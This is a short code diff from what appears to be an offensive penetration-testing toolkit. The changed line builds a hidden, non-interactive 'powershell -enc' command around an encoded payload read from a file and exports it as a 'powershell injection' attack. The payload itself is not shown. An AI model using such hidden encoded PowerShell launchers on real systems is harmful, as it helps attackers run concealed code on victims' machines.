@@ -64,7 +64,7 @@ try:
 
     x86 = file(setdir + "/x86.powershell", "r")
     x86 = x86.read()
-    x86 = "powershell -nop -window hidden -noni -enc " + x86
+    x86 = "powershell -nop -win hid -noni -enc " + x86
     print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
     filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
